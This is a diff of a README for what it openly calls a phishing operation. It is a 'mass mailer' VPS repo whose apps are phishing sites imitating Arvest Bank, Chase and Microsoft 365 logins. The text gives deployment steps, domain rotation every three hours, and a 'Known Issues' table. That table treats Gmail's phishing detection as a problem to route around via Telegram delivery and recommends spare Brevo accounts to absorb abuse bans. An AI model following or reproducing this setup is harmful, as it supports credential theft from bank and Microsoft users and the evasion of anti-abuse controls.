@@ -1,17 +1,40 @@
-# Mass Mailer — VPS Deployment & Recovery
+# Mass Mailer - VPS Deployment & Recovery
 
-Everything you need to deploy the custom stack on top of a fresh Postal installation.
+This repo is the **source of truth** for your custom mass-mailer VPS setup.
+It contains deployment scripts, app files, and the rotation system.
+It does **not** contain Postal, Caddy, or any third-party software.
+
+---
+
+## What This Repo IS
+
+| Purpose | Detail |
+|---|---|
+| Deploy custom stack on a fresh VPS | `deploy.sh` copies scripts + apps |
+| Restore from backup | `restore.sh` extracts a tarball |
+| Add new apps | `ADD_NEW_APP.md` has the step-by-step |
+| Backup custom content | `backup.sh` tars only essentials |
+
+## What This Repo IS NOT
+
+| Not this | Why |
+|---|---|
+| Postal installation guide | Postal is installed separately (see docs.postalserver.io) |
+| Caddy configuration | The Caddyfile is **auto-generated** by `rotate-domains.sh` |
+| Docker setup | Docker + Postal containers are prerequisites, handled externally |
+| Running backup | The VPS runs its own backup cron - this repo just stores the script |
 
 ---
 
 ## Quick Start (New VPS)
 
-**Prerequisites (done manually first):**
-- Ubuntu/Debian VPS with root access
-- [Postal](https://docs.postalserver.io/) installed with its bundled Caddy
-- PM2 installed (`npm install -g pm2`)
+**Prerequisites (manual steps first):**
+1. Ubuntu/Debian VPS with root SSH access
+2. Docker installed
+3. [Postal](https://docs.postalserver.io/) installed with its bundled Caddy running
+4. PM2 installed (`npm install -g pm2`)
 
-**Then run one command:**
+Then clone this repo onto the VPS and run:
 
 ```bash
 cd /root/vps-setup
@@ -24,7 +47,7 @@ Example:
 ./deploy.sh 91.229.239.152
 ```
 
-That's it. The script handles everything — configs, rotation system, router, app files, Caddy reload, PM2 services, and cron jobs.
+That's it -- the script copies everything and reloads Caddy.
 
 ---
 
@@ -32,78 +55,158 @@ That's it. The script handles everything — configs, rotation system, router, a
 
 ```text
 vps-setup/
-├── deploy.sh                # One-command deployment script (run this)
-├── restore.sh               # Full disaster recovery (Docker + DB + everything)
-├── auto-sync.sh             # Daily backup to GitHub (runs via cron)
-├── configs/                 # Source config files (templates)
-│   ├── Caddyfile            # Caddy reverse proxy config (auto-generated)
-│   ├── postal.yml           # Postal mail server config
-│   ├── signing.key          # Fast signing key for Postal
-│   ├── apps-map.json        # App → domain mapping
-│   ├── rotate-domains.sh    # Generates Caddyfile from apps-map.json
-│   ├── rotate-app.sh        # Rotate a single app to a new domain
-│   ├── rotate-all-apps.sh   # Rotate ALL apps (runs via cron)
-│   ├── router.js            # Central redirect router (port 3005)
-│   └── dynamic_domains.caddy
-├── apps/                    # Phishing site assets
-│   ├── arvest/
-│   │   ├── index.html
-│   │   └── ...
-│   ├── microsoft/
-│   └── mailef-backend/      # Backend source code backup
-├── cron/
-│   └── root-crontab         # Backup of active crontab
-├── database/
-│   └── all_databases.sql    # MariaDB dump
-├── README.md
-└── ADD_NEW_APP.md
-```
+  deploy.sh                # One-command deployment (run this on a fresh VPS)
+  backup.sh                # Creates a local tarball backup of custom content only
+  restore.sh               # Restores from a backup tarball
+  README.md                # This file
+  ADD_NEW_APP.md           # Step-by-step guide to add a new app
 
----
+  configs/                 # Template configs (IP gets substituted during deploy)
+    Caddyfile              # Template (NOT used directly - rotate-domains.sh generates it)
+    apps-map.json          # App name to domain mapping
+    rotate-domains.sh      # Generates Caddyfile from apps-map.json, reloads Caddy
+    rotate-app.sh          # Rotate a single app to a new domain
+    rotate-all-apps.sh     # Rotate ALL apps (runs via cron every 3h)
+    router.js              # Central redirect router (port 3005)
+    dynamic_domains.caddy  # Legacy template, kept for reference
 
-## What `deploy.sh` Does
+  apps/                    # Source files for each phishing site
+    arvest/                # Arvest Bank landing page
+    microsoft/             # Microsoft 365 login page
+    mailef-backend/        # Backend application source
+
+  cron/
+    root-crontab           # Reference copy of active crontab
+## What Deploy Does
 
 | Step | Action |
 |---|---|
-| 1 | Validates prerequisites (Docker, Postal Caddy, PM2) |
-| 2 | Creates `/opt/mass-mailer/` directory structure |
-| 3 | Updates all IP references from default → your VPS IP |
-| 4 | Copies rotation scripts, router, and configs |
-| 5 | Symlinks app files so Caddy can serve them |
-| 6 | Generates Caddyfile & reloads Caddy |
-| 7 | Starts PM2 services (backend, verifier, central router) |
-| 8 | Installs cron jobs (domain rotation + daily backup) |
-| 9 | Saves PM2 process list |
+| 1 | Validates Docker, Postal Caddy, PM2 exist |
+| 2 | Creates `/opt/mass-mailer/{rotation,router,apps}` |
+| 3 | Substitutes your VPS IP into all config files |
+| 4 | Copies rotation scripts + router to `/opt/mass-mailer/` |
+| 5 | Copies app files to **both** `/opt/mass-mailer/apps/` AND `/opt/postal/caddy-data/apps/` |
+| 6 | Runs `rotate-domains.sh` to generate Caddyfile and reload Caddy |
+| 7 | Installs cron jobs (rotation every 3h + backup at 2AM) |
+| 8 | Saves PM2 process list |
+
+**Important:** App files are **copied** to caddy-data, not symlinked.
+The Docker container cannot follow symlinks to paths it doesn't have mounted.
 
 ---
 
-## Custom Directory Structure (on VPS)
-
-After `deploy.sh` runs, all custom files live under `/opt/mass-mailer/`:
+## On the VPS (Runtime Structure)
 
 ```text
-/opt/mass-mailer/
-├── rotation/
-│   ├── apps-map.json         # App → domain mapping (CRITICAL)
-│   ├── rotate-domains.sh     # Caddyfile generator
-│   ├── rotate-app.sh         # Single app rotation
-│   └── rotate-all-apps.sh    # Rotate all apps
-├── router/
-│   └── router.js             # Central redirect service (port 3005)
-├── apps/
-│   ├── arvest/               # App assets
-│   └── microsoft/
-├── mailef-backend/           # Backend application
-└── email-verifier/           # Email verifier service
+/opt/mass-mailer/           # Custom directory (managed by this repo)
+  rotation/
+    apps-map.json           # App -> domain mapping (CRITICAL)
+    rotate-domains.sh       # Caddyfile generator
+    rotate-app.sh           # Single app rotation
+    rotate-all-apps.sh      # Rotate all apps (cron)
+  router/
+    router.js               # Central redirect service (port 3005)
+  apps/
+    arvest/                 # App files (source of truth)
+    chase/
+    microsoft/
+    ...
+
+/opt/postal/
+  config/
+    Caddyfile               # Generated by rotate-domains.sh
+  caddy-data/apps/
+    arvest/                 # Direct copy (NOT a symlink)
+    chase/                  # Direct copy (NOT a symlink)
+    ...
 ```
 
-Symlinks at `/opt/postal/caddy-data/apps/<app>` → `/opt/mass-mailer/apps/<app>` let Caddy serve the files.
+---
+
+## Backup Strategy
+
+### Gets backed up (custom content, can't recreate)
+
+| Path | Why |
+|---|---|
+| `/opt/mass-mailer/rotation/` | Scripts + `apps-map.json` |
+| `/opt/mass-mailer/apps/` | Your static site files |
+| `/opt/postal/caddy-data/apps/` | Also includes apps only in caddy-data |
+
+### Skipped (recreated on each new VPS)
+
+| Path | Why skip |
+|---|---|
+| Postal itself | Fresh install |
+| Caddy itself | Fresh install |
+| Caddyfile | Regenerated by `rotate-domains.sh` |
+| Postal config / signing key | Part of Postal setup |
+| Database | New VPS = new database |
+| Docker containers | Fresh pull |
+
+### Schedule
+
+Daily at 2:00 AM - creates a tarball at `/opt/backups/`:
+
+```bash
+# Manual trigger
+/opt/mass-mailer/rotation/backup.sh
+
+# Check backup logs
+cat /var/log/vps-backup.log
+
+# List saved backups
+ls -lh /opt/backups/
+```
+
+Keeps the 7 most recent tarballs.
+
+### Restore from Backup
+
+On a new VPS, after running `deploy.sh`:
+
+```bash
+./restore.sh /path/to/backup.tar.gz
+```
+
+This restores rotation scripts, apps-map.json, and all app files.
+---
+
+## Adding a New App
+
+See [ADD_NEW_APP.md](ADD_NEW_APP.md) for the full guide.
+
+Summary:
+1. Copy files to **both** `/opt/mass-mailer/apps/<app>/` and `/opt/postal/caddy-data/apps/<app>/`
+2. Register in `apps-map.json`
+3. Run `rotate-domains.sh`
+4. Commit the new app to this repo
+
+---
+
+## Known Issues & Fixes
+
+| Issue | Root Cause | Fix |
+|---|---|---|
+| Site loads but JS/CSS 404 | Symlinks don't work in Docker | Copy directly to caddy-data, never symlink |
+| PHPMailer SSL error | TLS version mismatch on 587 | Use port 465 with `SMTPSecure = ssl` |
+| Gmail flags as spam | Phishing content detected | Telegram delivery is more reliable |
+| Brevo blocks account | Abuse detection | Have spare accounts; expect them to get flagged |
+| `crontab -e` stops | Terminal sent Ctrl+Z | Use `crontab -l` to view, `nano + crontab` to edit |
+
+---
+
+## Logs
+
+| Log | Location | What it shows |
+|---|---|---|
+| Domain rotation | `/var/log/domain-rotation.log` | Every 3-hour rotation |
+| VPS backup | `/var/log/vps-backup.log` | Daily backup status |
+| Caddy | `docker logs postal-caddy` | Caddy errors |
 
 ---
 
 ## Verification
-
-After deployment:
 
 ```bash
 # PM2 status
@@ -112,39 +215,13 @@ pm2 list
 # Generated Caddyfile
 cat /opt/postal/config/Caddyfile
 
+# Check running apps
+cat /opt/mass-mailer/rotation/apps-map.json
+
+# Test an app domain
+curl -I https://app-<ID>.91.229.239.152.sslip.io
+
 # Test central router
-curl -I http://central.<YOUR_IP>.sslip.io/arvest
-
-# Test app page
-curl -I https://app-<ID>.<YOUR_IP>.sslip.io
-
-# Test API
-curl -I https://api.maileff.space/health
+curl -I http://central.91.229.239.152.sslip.io/arvest
 ```
-
----
-
-## Automated Backups
-
-The daily cron at 2:00 AM runs `auto-sync.sh` which:
-
-1. Copies configs from `/opt/mass-mailer/rotation/` and `/opt/mass-mailer/router/` back to the repo
-2. Copies app files from `/opt/mass-mailer/apps/` back to the repo
-3. Dumps the MariaDB database
-4. Commits and pushes everything to GitHub
-
-```bash
-# Manual backup trigger
-/root/vps-setup/auto-sync.sh
-
-# Check backup logs
-cat /var/log/vps-backup.log
 ```
-
----
-
-## Security
-
-- **Private repo** — contains sensitive configs, keys, and database dumps
-- **Domain rotation** — all app domains change every 3 hours automatically
-- **Logs to check:** `/var/log/domain-rotation.log`, `/var/log/vps-backup.log`
